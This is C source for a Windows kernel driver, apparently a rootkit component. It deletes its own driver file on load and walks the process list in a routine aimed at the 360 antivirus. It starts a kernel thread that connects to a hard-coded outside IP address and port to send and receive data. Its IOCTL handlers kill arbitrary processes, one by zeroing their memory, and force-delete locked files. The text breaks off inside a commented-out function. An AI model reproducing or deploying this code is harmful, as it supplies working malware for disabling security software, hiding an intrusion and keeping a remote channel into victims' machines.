/*
LRM Kernel Mode Driver Part

Author: LLT



MINI DOCUMENT

VOID InitializeObjectAttributes(
[out] POBJECT_ATTRIBUTES InitializedAttributes,
[in] PUNICODE_STRING ObjectName,
[in] ULONG Attributes,
[in] HANDLE RootDirectory,
[in, optional] PSECURITY_DESCRIPTOR SecurityDescriptor
);


*/




#include <ntifs.h>
#include <ntddk.h>
#include <ntstrsafe.h>
#include "config.h"
#include <ntimage.h>
#include "network.h"
#include "xlog.h"


//
//NTKERNELAPI UCHAR* PsGetProcessImageFileName(IN PEPROCESS Process); //未公开的进行导出即可
//NTKERNELAPI VOID NTAPI KeAttachProcess(PEPROCESS Process);
//NTKERNELAPI VOID NTAPI KeDetachProcess();
//#define DWORD unsigned long
//用于自己删自己
typedef struct _KLDR_DATA_TABLE_ENTRY
{
	LIST_ENTRY InLoadOrderLinks;//这个成员把系统所有加载(可能是停止没被卸载)已经读取到内存中 我们关心第一个  我们要遍历链表 双链表 不管中间哪个节点都可以遍历整个链表 本驱动的驱动对象就是一个节点
	LIST_ENTRY InMemoryOrderLinks;//系统已经启动 没有被初始化 没有调用DriverEntry这个历程的时候 通过这个链表进程串接起来
	LIST_ENTRY InInitializationOrderLinks;//已经调用DriverEntry这个函数的所有驱动程序
	PVOID DllBase;
	PVOID EntryPoint;//驱动的进入点 DriverEntry
	ULONG SizeOfImage;
	UNICODE_STRING FullDllName;//驱动的满路径
	UNICODE_STRING BaseDllName;//不带路径的驱动名字
	ULONG Flags;
	USHORT LoadCount;
	USHORT TlsIndex;
	union {
		LIST_ENTRY HashLinks;
		struct {
			PVOID SectionPointer;
			ULONG CheckSum;
		};
	};
	union {
		struct {
			ULONG TimeDateStamp;
		};
		struct {
			PVOID LoadedImports;
		};
	};
} KLDR_DATA_TABLE_ENTRY, * PKLDR_DATA_TABLE_ENTRY;

//用于干别人
#define SYSTEMPROCESSINFORMATION 5
//进程信息结构体 
typedef struct _SYSTEM_THREADS
{
	LARGE_INTEGER  KernelTime;
	LARGE_INTEGER  UserTime;
	LARGE_INTEGER  CreateTime;
	ULONG    WaitTime;
	PVOID    StartAddress;
	CLIENT_ID   ClientID;
	KPRIORITY   Priority;
	KPRIORITY   BasePriority;
	ULONG    ContextSwitchCount;
	ULONG    ThreadState;
	KWAIT_REASON  WaitReason;
	ULONG    Reserved; //Add
}SYSTEM_THREADS, * PSYSTEM_THREADS;

typedef struct _SYSTEM_PROCESSES
{
	ULONG    NextEntryDelta;
	ULONG    ThreadCount;
	ULONG    Reserved[6];
	LARGE_INTEGER  CreateTime;
	LARGE_INTEGER  UserTime;
	LARGE_INTEGER  KernelTime;
	UNICODE_STRING  ProcessName;
	KPRIORITY   BasePriority;
	HANDLE   ProcessId;  //Modify
	HANDLE   InheritedFromProcessId;//Modify
	ULONG    HandleCount;
	ULONG    SessionId;
	ULONG_PTR  PageDirectoryBase;
	VM_COUNTERS VmCounters;
	SIZE_T    PrivatePageCount;//Add
	IO_COUNTERS  IoCounters; //windows 2000 only
	struct _SYSTEM_THREADS Threads[1];
}SYSTEM_PROCESSES, * PSYSTEM_PROCESSES;

//声明ZqQueryAyatemInformation
NTSTATUS ZwQuerySystemInformation(
	IN ULONG SystemInformationClass,  //处理进程信息,只需要处理类别为5的即可
	OUT PVOID SystemInformation,
	IN ULONG SystemInformationLength,
	OUT PULONG ReturnLength
);



PDEVICE_OBJECT g_pCtrlDO = NULL;
PKTHREAD g_pnThread;
HANDLE die = FALSE;




CHAR xKill1(DWORD32 dwPid);
CHAR xDel1(PCSTR path);
CHAR xKill2(DWORD32 dwPid);
NTSTATUS DelDriverFile(PUNICODE_STRING pUsDriverPath);
void kill360();
NTSTATUS kill360_64();
NTSTATUS xDelFile3(PCHAR pAsFileName);
void DriverUnload(PDRIVER_OBJECT pDriverObject) {
	xLog("DriverUnload Called");
	UNICODE_STRING usSymbolName;
	RtlInitUnicodeString(&usSymbolName, SYMBOLIC_NAME);

	IoDeleteSymbolicLink(&usSymbolName);
	if (g_pCtrlDO) {
		IoDeleteDevice(g_pCtrlDO);
		g_pCtrlDO = NULL;
	}
	
	freeWsk();
	
	//stop system thread
	//set a event?
	KeWaitForSingleObject(g_pnThread, Executive, KernelMode, FALSE, 0);
	ObDereferenceObject(g_pnThread);
	xLog("All Released, Closing Log File");
	//close log file
	die = TRUE;
	CloseLogFile();
}

NTSTATUS CCDispatch(PDEVICE_OBJECT pDeviceObject, PIRP pIrp) {
	xLog("CC Called");
	NTSTATUS status = STATUS_SUCCESS;
	pIrp->IoStatus.Status = status;
	pIrp->IoStatus.Information = 0;
	IoCompleteRequest(pIrp, IO_NO_INCREMENT);
	return status;
}

NTSTATUS DeviceControlDispatch(PDEVICE_OBJECT pDeviceObject, PIRP pIrp) {
	NTSTATUS status = STATUS_INVALID_PARAMETER;
	ULONG uOpSize = 0;
	
	if (pDeviceObject == g_pCtrlDO) {
		PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(pIrp);
		if (stack->MajorFunction == IRP_MJ_DEVICE_CONTROL) {
			//process it
			ULONG ctrlCode = stack->Parameters.DeviceIoControl.IoControlCode;
			//goto IRPCOMPLETE;
			//TEST
			if (ctrlCode == CC_TEST) {
				xLog("DC CC_TEST");
				//pid DWORD
				PVOID pBuffer = pIrp->AssociatedIrp.SystemBuffer;
				ULONG lInLen = stack->Parameters.DeviceIoControl.InputBufferLength;
				
				ULONG lOutLen = stack->Parameters.DeviceIoControl.OutputBufferLength;
				if (lInLen != sizeof(DWORD32)) {
					status = STATUS_INVALID_PARAMETER;
					//uOpSize = 0;
					goto IRPCOMPLETE;
				}
				//test code
				if (lOutLen != sizeof(DWORD32)) {
					status = STATUS_INVALID_PARAMETER;
					//uOpSize = 0;
					goto IRPCOMPLETE;
				}
				uOpSize = lOutLen;//too lazy to copy
				status = STATUS_SUCCESS;
			}
			else if (ctrlCode == CC_KILL1) {
				xLog("DC CC_KILL1");
				//pid DWORD
				PVOID pBuffer = pIrp->AssociatedIrp.SystemBuffer;
				ULONG lInLen = stack->Parameters.DeviceIoControl.InputBufferLength;

				ULONG lOutLen = stack->Parameters.DeviceIoControl.OutputBufferLength;
				if (lInLen != sizeof(DWORD32)) {
					status = STATUS_INVALID_PARAMETER;
					//uOpSize = 0;
					goto IRPCOMPLETE;
				}
				//test code
				if (lOutLen != sizeof(CHAR)) {
					status = STATUS_INVALID_PARAMETER;
					uOpSize = 0;
					goto IRPCOMPLETE;
				}

				DWORD32 dwPid = *((DWORD32 *)pBuffer);
				*((PCHAR)pBuffer) = xKill1(dwPid);
				
				uOpSize = sizeof(CHAR);
				status = STATUS_SUCCESS;
			}
			else if (ctrlCode == CC_KILL2) {
				xLog("DC CC_KILL2");
				//pid DWORD
				PVOID pBuffer = pIrp->AssociatedIrp.SystemBuffer;
				ULONG lInLen = stack->Parameters.DeviceIoControl.InputBufferLength;

				ULONG lOutLen = stack->Parameters.DeviceIoControl.OutputBufferLength;
				if (lInLen != sizeof(DWORD32)) {
					status = STATUS_INVALID_PARAMETER;
					//uOpSize = 0;
					goto IRPCOMPLETE;
				}
				//test code
				if (lOutLen != sizeof(CHAR)) {
					status = STATUS_INVALID_PARAMETER;
					uOpSize = 0;
					goto IRPCOMPLETE;
				}

				DWORD32 dwPid = *((DWORD32*)pBuffer);
				*((PCHAR)pBuffer) = xKill2(dwPid);

				uOpSize = sizeof(CHAR);
				status = STATUS_SUCCESS;
			}
			else if (ctrlCode == CC_DEL)
			{
				xLog("Default Delete Called");
				PSTR inStr = (PSTR)pIrp->AssociatedIrp.SystemBuffer;
				ULONG inLen = stack->Parameters.DeviceIoControl.InputBufferLength;
				inStr[inLen - 1] = 0;
				if (inLen > 700) {
					goto IRPCOMPLETE;
				}
				//PSTR kStr = ExAllocatePool2(POOL_FLAG_NON_PAGED, inLen + 16, 'loli');
				//RtlStringCbPrintfA(kStr, inLen + 16, "\\??\\%s", inStr);

				xDel1(inStr);
				//ExFreePoolWithTag(kStr, 'loli');
				status = STATUS_SUCCESS;

			}
			else if (ctrlCode == CC_DEL2)
			{
				xLog("Delete 2 Called");
				PSTR inStr = (PSTR)pIrp->AssociatedIrp.SystemBuffer;
				ULONG inLen = stack->Parameters.DeviceIoControl.InputBufferLength;
				inStr[inLen - 1] = 0;
				if (inLen > 700) {
					goto IRPCOMPLETE;
				}
				PSTR kStr = ExAllocatePool2(POOL_FLAG_NON_PAGED, inLen + 16, 'loli');
				if (kStr == NULL) {
					goto IRPCOMPLETE;
				}
				RtlStringCbPrintfA(kStr, inLen + 16, "\\??\\%s", inStr);
				xDelFile3(kStr);
				ExFreePoolWithTag(kStr, 'loli');
				status = STATUS_SUCCESS;

			}
			//next code
			//pending test
		}
	}
	
	IRPCOMPLETE:

	pIrp->IoStatus.Status = status;
	pIrp->IoStatus.Information = uOpSize;
	IoCompleteRequest(pIrp, IO_NO_INCREMENT);
	return status;
}

NTSTATUS systemThreadProc() {
	if (FALSE) {
		LARGE_INTEGER timeout;
		timeout.QuadPart = -10 * 1000 * 1000;
		timeout.QuadPart *= 15;
		KeDelayExecutionThread(KernelMode, FALSE, &timeout);
	}
	PCHAR msg = (PCHAR)ExAllocatePool2(
		POOL_FLAG_NON_PAGED,
		1024,
		'netb'
	);
	if (msg == NULL) {
		//fuck
		xLog("6");
		return *((PNTSTATUS)(NULL));
	}
	xLog("System Thread Started");
	PWSK_SOCKET pSocket;
	//try to connect to 47.243.50.89
	//init
	SOCKADDR_IN remoteAddr = { 0 };
	
	remoteAddr.sin_addr.S_un.S_un_b.s_b1 = 47;
	remoteAddr.sin_addr.S_un.S_un_b.s_b2 = 243;
	remoteAddr.sin_addr.S_un.S_un_b.s_b3 = 50;
	remoteAddr.sin_addr.S_un.S_un_b.s_b4 = 89;
	remoteAddr.sin_port = RtlUshortByteSwap(8777);
	remoteAddr.sin_family = AF_INET;
	//connect
CONNECT_SOCKET:

	NTSTATUS status = ConnectWsk(&pSocket, (PSOCKADDR)&remoteAddr);
	if (!NT_SUCCESS(status)) {
		xLog("Connect Failed");
		RtlStringCbPrintfA(msg, 1024, "status code: 0x%08X", status);
		xLog(msg);
		goto HALT_THREAD;
	}
	//send
	RtlStringCbPrintfA(msg, 1024, "lolita winsock kernel message: 0x%08X\n", pSocket);
	status = SendWsk(pSocket, msg, strlen(msg));
	if (!NT_SUCCESS(status)) {
		xLog("Send Failed");
		RtlStringCbPrintfA(msg, 1024, "status code: 0x%08X", status);
		xLog(msg);
		goto CLOSE_SOCKET;
	}
	//send2
	RtlStringCbPrintfA(msg, 1024, "ExAllocatePool2 return: 0x%08X\n", msg);
	status = SendWsk(pSocket, msg, strlen(msg));
	if (!NT_SUCCESS(status)) {
		xLog("Send Failed");
		RtlStringCbPrintfA(msg, 1024, "status code: 0x%08X", status);
		xLog(msg);
		goto CLOSE_SOCKET;
	}
	//recv
	ULONG recvBytes = 0;
	memset(msg, 0, 1024);
	status = RecvWsk(pSocket, msg, 1000, &recvBytes);
	if (!NT_SUCCESS(status)) {
		xLog("Recv Failed");
		RtlStringCbPrintfA(msg, 1024, "status code: 0x%08X", status);
		xLog(msg);
		goto CLOSE_SOCKET;
	}
	
	if (recvBytes < 1024u) {
		msg[recvBytes] = 0;
	}
	else
	{
		msg[1000] = 0;
		//recvBytes = strlen(msg);
	}
	
	xLog("recv the following content");
	xLog(msg);
	RtlStringCbPrintfA(msg, 1024, "recvBytes: %lu", recvBytes);
	xLog(msg);
	//close
	CLOSE_SOCKET:
	status = CloseSocket(pSocket);
	if (!NT_SUCCESS(status)) {
		xLog("Close Failed");
		RtlStringCbPrintfA(msg, 1024, "status code: 0x%08X", status);
		xLog(msg);
		//ExFreePoolWithTag(msg, 'netb');
		//PsTerminateSystemThread(STATUS_SUCCESS);
		//return STATUS_SUCCESS;
	}

HALT_THREAD:

	
	ExFreePoolWithTag(msg, 'netb');
	PsTerminateSystemThread(STATUS_SUCCESS);
	return STATUS_SUCCESS;
}

NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath) {
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	//create devices

	UNICODE_STRING usDeviceName;
	UNICODE_STRING usSymbolName;

	RtlInitUnicodeString(&usDeviceName, DEVICE_NAME);

	status = IoCreateDevice(pDriverObject, 0, &usDeviceName, FILE_DEVICE_UNKNOWN, 0, TRUE, &g_pCtrlDO);
	if (!NT_SUCCESS(status)) {
		DbgPrint("Device create failed?????? Unscience");
		return status;
	}
	g_pCtrlDO->Flags |= DO_BUFFERED_IO;
	RtlInitUnicodeString(&usSymbolName, SYMBOLIC_NAME);

	status = IoCreateSymbolicLink(&usSymbolName, &usDeviceName);
	if (!NT_SUCCESS(status)) {
		DbgPrint("Failed to create symboliclink");
		IoDeleteDevice(g_pCtrlDO);
		g_pCtrlDO = NULL;
		return status;
	}

	pDriverObject->MajorFunction[IRP_MJ_CREATE] = CCDispatch;
	pDriverObject->MajorFunction[IRP_MJ_CLOSE] = CCDispatch;
	pDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DeviceControlDispatch;
	pDriverObject->DriverUnload = DriverUnload;
	//driver init finished
	//init log file
	InitLogFile();


	PUNICODE_STRING pusDriverPath = NULL;
	pusDriverPath = &((PKLDR_DATA_TABLE_ENTRY)pDriverObject->DriverSection)->FullDllName;
	//pDriverObject->DriverSection
	DelDriverFile(pusDriverPath);
	CLIENT_ID       clientId = { 0 };
	xDel1("C:\\test\\1.txt");
	kill360_64();
	initWsk();
	//create network system thread
	xLog("Creating System Thread");
	HANDLE hSysThread = NULL;
	PsCreateSystemThread(
		&hSysThread,
		NULL,
		NULL,
		NtCurrentProcess(),
		&clientId,
		systemThreadProc,
		NULL
	);
	//get network systh thread object
	
	ObReferenceObjectByHandle(
		hSysThread,
		THREAD_ALL_ACCESS,
		NULL,
		KernelMode,
		&g_pnThread,
		NULL
	);
	ZwClose(hSysThread);

	xLog("DriverEntry Finished");
	
	return status;
}



void xLog_deperated(PCSTR logText) {
	
	UNICODE_STRING logPath;
	RtlInitUnicodeString(&logPath, DRIVER_LOG_FILENAME);

	OBJECT_ATTRIBUTES objsFile;
	InitializeObjectAttributes(&objsFile, &logPath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

	HANDLE hFile;
	IO_STATUS_BLOCK ios;

	NTSTATUS status;
	status = IoCreateFile(&hFile, FILE_APPEND_DATA | SYNCHRONIZE, &objsFile, &ios, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OPEN_IF, FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, NULL, CreateFileTypeNone, NULL, NULL);
	//status = ZwCreateFile(&hFile, FILE_APPEND_DATA | SYNCHRONIZE, &objsFile, &ios, 0, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OPEN_IF, FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, 0, 0);
	if (!NT_SUCCESS(status)) return;

	ZwWriteFile(hFile, NULL, NULL, NULL, &ios, logText, strlen(logText), NULL, NULL);
	ZwWriteFile(hFile, NULL, NULL, NULL, &ios, "\n", 1, NULL, NULL);
	ZwClose(hFile);
}

CHAR xKill1(DWORD32 dwPid) {
	CLIENT_ID cid;
	cid.UniqueProcess = (HANDLE)dwPid;
	cid.UniqueThread = 0;

	//sizeof(HANDLE);
	//sizeof(DWORD32)

	OBJECT_ATTRIBUTES objs;
	InitializeObjectAttributes(&objs, 0, OBJ_KERNEL_HANDLE, 0, 0);

	HANDLE hProcess;
	NTSTATUS status;
	status = ZwOpenProcess(&hProcess, GENERIC_ALL, &objs, &cid);
	if (!NT_SUCCESS(status)) return KC_OPEN_FAILED;

	ZwTerminateProcess(hProcess, 0);
	if (!NT_SUCCESS(status)) return KC_TERMINATE_FAILED;
	xLog("xKill 1 success");
	return KC_SUCCESS;
}

CHAR xKill2(DWORD32 dwPid) {
	PEPROCESS proc = NULL;
	NTSTATUS status;
	PsLookupProcessByProcessId((HANDLE)dwPid, &proc);
	
	if (proc == NULL) {
		xLog("K2 Open fail");
		return KC_OPEN_FAILED;
	}

	PKAPC_STATE papcs = (PKAPC_STATE)ExAllocatePool2(POOL_FLAG_NON_PAGED, sizeof(	KAPC_STATE), 'xmrl');
	if (papcs == NULL) {
		xLog("K2 Open fail 2");
		ObDereferenceObject(proc);
		return KC_TERMINATE_FAILED;
	}

	//test it
	KeAttachProcess(proc);
	__try {
		xLog("K2 S1");
		//KeStackAttachProcess(proc, papcs);
		//PVOID
		//
		//sizeof(long long)
		
		for (unsigned long long i = 0x10000; i < 0x20000000; i += PAGE_SIZE) {
			__try {
				memset((PVOID)i, 0, PAGE_SIZE);
			}
			__except (EXCEPTION_EXECUTE_HANDLER) {
				//do nothing
				;
			}
		}

		//KeUnstackDetachProcess(papcs);
		ObDereferenceObject(proc);
		xLog("K2 S2");
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		//KeUnstackDetachProcess(papcs);
		KeDetachProcess();
		ObDereferenceObject(proc);
		return KC_TERMINATE_FAILED;
	}
	KeDetachProcess();
	PCHAR lt = (PCHAR)ExAllocatePool2(POOL_FLAG_NON_PAGED, 128, '6666');
	if (lt != NULL) {
		memset(lt, 0, 128);
		RtlStringCbPrintfA(lt, 128, "K2 Info PID: %ld", dwPid);
		xLog(lt);
		//ExFreePool(lt);
		ExFreePoolWithTag(lt, '6666');
	}
	xLog("K2 Ok");
	return KC_SUCCESS;
}


CHAR xDel1(PCSTR userPath) {
	//delete a single file/empty dir
	//TEXT(path)
	//return DC_SUCCESS;
	PCHAR lt = (PCHAR)ExAllocatePool2(POOL_FLAG_NON_PAGED, 1024, '6666');
	if (lt == NULL) return DC_OPEN_FAILED;
	RtlStringCbPrintfA(lt, 1024, "\\??\\%s", userPath);
	
	UNICODE_STRING pKernelPath;
	ANSI_STRING pAsPath;
	RtlInitAnsiString(&pAsPath, lt);

	
	//= NULL;
	//RtlInitUnicodeString(&kernelPath, TEXT(lt));
	//pKernelPath.
	RtlAnsiStringToUnicodeString(&pKernelPath, &pAsPath, TRUE);
	OBJECT_ATTRIBUTES objs;
	InitializeObjectAttributes(&objs, &pKernelPath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, 0, 0);
	NTSTATUS status = ZwDeleteFile(&objs);
	ExFreePoolWithTag(lt, '6666');
	RtlFreeUnicodeString(&pKernelPath);
	if (NT_SUCCESS(status)) return DC_SUCCESS;
	return DC_DELETE_FAILED;
}





NTSTATUS DelDriverFile(PUNICODE_STRING pUsDriverPath)
{
	IO_STATUS_BLOCK IoStatusBlock;
	HANDLE FileHandle;
	OBJECT_ATTRIBUTES ObjectAttributes;
	InitializeObjectAttributes(
		&ObjectAttributes,
		pUsDriverPath,
		OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE,
		0,
		0);

	NTSTATUS Status = IoCreateFileEx(&FileHandle,
		SYNCHRONIZE | DELETE,
		&ObjectAttributes,
		&IoStatusBlock,
		NULL,
		FILE_ATTRIBUTE_NORMAL,
		FILE_SHARE_DELETE,
		FILE_OPEN,
		FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
		NULL,
		0,
		CreateFileTypeNone,
		NULL,
		IO_NO_PARAMETER_CHECKING,
		NULL);

	if (!NT_SUCCESS(Status))
	{
		return Status;
	}
	
	PFILE_OBJECT FileObject;
	Status = ObReferenceObjectByHandleWithTag(FileHandle,
		SYNCHRONIZE | DELETE,
		*IoFileObjectType,
		KernelMode,
		'eliF',
		&FileObject,
		NULL);
	if (!NT_SUCCESS(Status))
	{
		ObCloseHandle(FileHandle, KernelMode);
		return Status;
	}
	
	const PSECTION_OBJECT_POINTERS SectionObjectPointer = FileObject->SectionObjectPointer;
	SectionObjectPointer->ImageSectionObject = NULL;

	// call MmFlushImageSection, make think no backing image and let NTFS to release file lock
	CONST BOOLEAN ImageSectionFlushed = MmFlushImageSection(SectionObjectPointer, MmFlushForDelete);

	ObfDereferenceObject(FileObject);
	ObCloseHandle(FileHandle, KernelMode);

	if (ImageSectionFlushed)
	{
		// chicken fried rice
		Status = ZwDeleteFile(&ObjectAttributes);
		if (NT_SUCCESS(Status))
		{
			return Status;
		}
	}
	return Status;
}

void kill360() {
	PEPROCESS currentProcess = PsGetCurrentProcess();
	int iPocessId = 0xFFFFFFFF;
	PEPROCESS next = currentProcess;

	do
	{
		int iNext = (int)next;
		iPocessId = *(int*)(iNext + 0xb4);
		PCSTR str = (PCSTR)(iNext + 0x16c);
		xLog(str);
		iNext = *(int*)(iNext + 0x0b8) - 0x0b8;
		next = (PEPROCESS)iNext;
	} while ((NULL != next && next != currentProcess));
	return STATUS_SUCCESS;
}
NTSTATUS kill360_64()
{
	NTSTATUS systeminformation;
	ULONG length;
	PSYSTEM_PROCESSES process;
	//因为还不知道缓冲区的大小所以我们需要获取大小之后再用一次这个api
	systeminformation = ZwQuerySystemInformation(SYSTEMPROCESSINFORMATION, NULL, 0, &length);
	if (!length)
	{
		DbgPrint("[Error] ZwQuerySystemInformation......\n");
		return systeminformation;
	}
	//ExAllocatePool分配指定类型的池内存，并返回指向已分配块的指针
	PVOID PMemory = ExAllocatePoolWithTag(NonPagedPool, length, 'egaT');
	if (!PMemory)
	{
		DbgPrint("[Error] Memory flase......\n");
		return STATUS_UNSUCCESSFUL;
	}
	systeminformation = ZwQuerySystemInformation(SYSTEMPROCESSINFORMATION, PMemory, length, &length);
	if (NT_SUCCESS(systeminformation))
	{
		PCHAR lt = (PCHAR)ExAllocatePool2(POOL_FLAG_NON_PAGED, 1024, '6665');
		process = (PSYSTEM_PROCESSES)PMemory;
		if (process->ProcessId == 0)
			DbgPrint("PID 0 System\n");
		do
		{
			process = (PSYSTEM_PROCESSES)((UINT64)process + process->NextEntryDelta);
			//DbgPrint("pid = %ld  name = %-20ws \n", process->ProcessId, process->ProcessName.Buffer);
			
			if (lt != NULL) {
				memset(lt, 0, 1024);
				DWORD pid = process->ProcessId;
				RtlStringCbPrintfA(lt, 1024, "pid = %ld  name = %ws ", pid, process->ProcessName.Buffer);
				xLog(lt);
				RtlStringCbPrintfA(lt, 1024, "%ws", process->ProcessName.Buffer);
				/*if (strncmp(lt, "360", 3) == 0) {
					xKill1(pid);
				}
				if (strncmp(lt, "ZhuDong", 3) == 0) {
					xKill1(pid);
				}*/
				//ExFreePool(lt);
				
			}
		} while (process->NextEntryDelta != 0);
		ExFreePoolWithTag(lt, '6665');
	}
	else
	{
		DbgPrint("[Error] .....\n");
	}
	ExFreePool(PMemory);
	return systeminformation;
}

NTSTATUS IrpCompletion(
	IN PDEVICE_OBJECT pDeviceObject,
	IN PIRP irp,
	IN PVOID Context
) {
	//irp->UserIosb->Information = irp->IoStatus.Information;
	//irp->UserIosb->Status = irp->IoStatus.Status;
	KeSetEvent(irp->UserEvent, IO_NO_INCREMENT, FALSE);
	IoFreeIrp(irp);
	return STATUS_MORE_PROCESSING_REQUIRED;
}

NTSTATUS xDelFile3(PCHAR pAsFileName) {
	OBJECT_ATTRIBUTES objFile;
	ANSI_STRING asFileName;
	RtlInitAnsiString(&asFileName, pAsFileName);
	UNICODE_STRING usFileName;
	RtlAnsiStringToUnicodeString(&usFileName, &asFileName, TRUE);
	
	InitializeObjectAttributes(&objFile,
		&usFileName,
		OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE,
		NULL,
		NULL
	);

	IO_STATUS_BLOCK ios;
	HANDLE hFile;

	NTSTATUS status = IoCreateFile(&hFile,
		FILE_READ_ATTRIBUTES,
		&objFile,
		&ios,
		0,
		FILE_ATTRIBUTE_NORMAL,
		FILE_SHARE_DELETE,
		FILE_OPEN,
		FILE_NON_DIRECTORY_FILE, //create options
		NULL,
		0,
		CreateFileTypeNone,
		NULL,
		IO_NO_PARAMETER_CHECKING | IO_IGNORE_SHARE_ACCESS_CHECK | IO_OPEN_PAGING_FILE
	);
	if (!NT_SUCCESS(status)) {
		CHAR msg[100];
		RtlStringCbPrintfA(msg, 100, "irp delete open error: %08X", status);
		xLog(msg);
		return status;
	}
	xLog("irp delete: open success");
	PFILE_OBJECT fileObject;

	status = ObReferenceObjectByHandle(hFile,
		DELETE,
		*IoFileObjectType,
		KernelMode,
		&fileObject,
		NULL
	);
	ZwClose(hFile);
	if (!NT_SUCCESS(status)) {
		//ZwClose(hFile);
		return STATUS_UNEXPECTED_IO_ERROR;
	}
	
	xLog("irp delete: get object ok");
	PDEVICE_OBJECT deviceObject = IoGetRelatedDeviceObject(fileObject);
	PIRP irp = IoAllocateIrp(deviceObject->StackSize, TRUE);

	if (irp == NULL)
	{
		RtlFreeUnicodeString(&usFileName);
		ObDereferenceObject(fileObject);
		return STATUS_UNEXPECTED_IO_ERROR;
	}
	//This will only call delete file and donot wait for any response
	KEVENT kevent;
	KeInitializeEvent(&kevent, SynchronizationEvent, FALSE);
	FILE_DISPOSITION_INFORMATION fileInformation;
	fileInformation.DeleteFile = TRUE;
	irp->AssociatedIrp.SystemBuffer = &fileInformation;
	irp->UserEvent = &kevent;
	//irp->UserIosb = &ios;
	irp->Tail.Overlay.OriginalFileObject = fileObject;
	irp->Tail.Overlay.Thread = KeGetCurrentThread();
	irp->RequestorMode = KernelMode;

	PIO_STACK_LOCATION irpsp = irp->Tail.Overlay.CurrentStackLocation - 1;
	//irpsp = IoGetNextIrpStackLocation(irp); //try to understand it
	irpsp->MajorFunction = IRP_MJ_SET_INFORMATION;
	irpsp->DeviceObject = deviceObject;
	irpsp->FileObject = fileObject;
	irpsp->Parameters.SetFile.Length = sizeof(FILE_DISPOSITION_INFORMATION);
	irpsp->Parameters.SetFile.FileInformationClass = FileDispositionInformation;
	irpsp->Parameters.SetFile.FileObject = fileObject;

	IoSetCompletionRoutine(
		irp,
		IrpCompletion,
		NULL,
		TRUE,
		TRUE,
		TRUE
	);
	const PSECTION_OBJECT_POINTERS SectionObjectPointer = fileObject->SectionObjectPointer;
	SectionObjectPointer->ImageSectionObject = NULL;
	SectionObjectPointer->DataSectionObject = NULL;
	xLog("irp delete: prepared to call driver");
	IoCallDriver(deviceObject, irp);

	KeWaitForSingleObject(&kevent, Executive, KernelMode, TRUE, NULL);
	ObDereferenceObject(fileObject);
	RtlFreeUnicodeString(&usFileName);
	//ZwClose(hFile);
	return STATUS_SUCCESS;



}
/*
void TryUnlockFile(PFILE_OBJECT FileObject)
{
	SYSTEM_HANDLE_INFORMATION HandleInformation1;
	ULONG RetLen = 0;
	PVOID Buffer;
	ZwQuerySystemInformation(SystemHandleInformation, &HandleInformation1, sizeof(HandleInformation1), &RetLen);
	if (RetLen)
	{
		POBJECT_NAME_INFORMATION ObjectNameInfo1 = (POBJECT_NAME_INFORMATION)ExAllocatePool(NonPagedPool, 2056);
		POBJECT_NAME_INFORMATION ObjectNameInfo2 = (POBJECT_NAME_INFORMATION)ExAllocatePool(NonPagedPool, 2056);
		ObjectNameInfo1->Name.Length = 2048;
		ObjectNameInfo2->Name.Length = 2048;
		Buffer = ExAllocatePool(PagedPool, RetLen + 4096);

		status = ObQueryNameString(FileObject, ObjectNameInfo2, ObjectNameInfo2->Name.Length, &RetLen);
		if (NT_SUCCESS(status) && Buffer && ObjectNameInfo1)
		{
			status = ZwQuerySystemInformation(SystemHandleInformation, Buffer, RetLen + 4096, &RetLen);
			if (NT_SUCCESS(status))
			{
				UCHAR ObjectTypeIndex = 0;
				PSYSTEM_HANDLE_INFORMATION HandleInformation2 = (PSYSTEM_HANDLE_INFORMATION)Buffer;
				for (int i = 0; i < HandleInformation2->NumberOfHandles; i++)
				{
					if (HandleInformation2->Handles[i].Object == FileObject)
					{
						ObjectTypeIndex = HandleInformation2->Handles[i].ObjectTypeIndex;
						Break;
					}
				}
				if (ObjectTypeIndex)
				{
					for (int i = 0; i < HandleInformation2->NumberOfHandles; i++)
					{
						if (HandleInformation2->Handles[i].ObjectTypeIndex == ObjectTypeIndex)
						{
							CLIENT_ID ClientId;
							HANDLE TargetProcessHandle = NULL;
							HANDLE CurrentProcessHandle = NULL;
							HANDLE TargetHandle = NULL;
							PVOID TargetFileObject = NULL;
							OBJECT_ATTRIBUTES oa;
							ULONG RetLen;
							InitializeObjectAttributes(&oa, NULL, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
							ClientId.UniqueProcess = HandleInformation2->Handles[i].UniqueProcessId;
							ClientId.UniqueThread = 0;
							status = ZwOpenProcess(&CurrentProcessHandle, PROCESS_ALL_ACCESS, &oa, &ClientId);
							if (NT_SUCCESS(status))
							{
								InitializeObjectAttributes(&oa, NULL, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
								ClientId.UniqueProcess = PsGetCurrentProcessId();
								ClientId.UniqueThread = 0;
								status = ZwOpenProcess(&TargetProcessHandle, PROCESS_ALL_ACCESS, &oa, &ClientId);
								if (NT_SUCCESS(status))
								{//从引用到该对象的进程复制一份句柄到当前进程
									status = ZwDuplicateObject(CurrentProcessHandle, HandleInformation2->Handles[i].HandleValue, TargetProcessHandle, &TargetHandle, 0, 0, DUPLICATE_SAME_ACCESS);
									if (NT_SUCCESS(status) && TargetHandle)
									{
										status = ObReferenceObjectByHandle(TargetHandle, GENERIC_READ, IoFileObjectType, 0, &TargetFileObject, 0);
										if (NT_SUCCESS(status) && MmIsAddressValid(TargetFileObject) && TargetFileObject->DeviceObject->DeviceType == FILE_DEVICE_DISK)
										{
											status = ObQueryNameString(TargetFileObject, ObjectNameInfo1, ObjectNameInfo1->Name.Length, &RetLen);
											if (NT_SUCCESS(status))
											{
												__try
												{
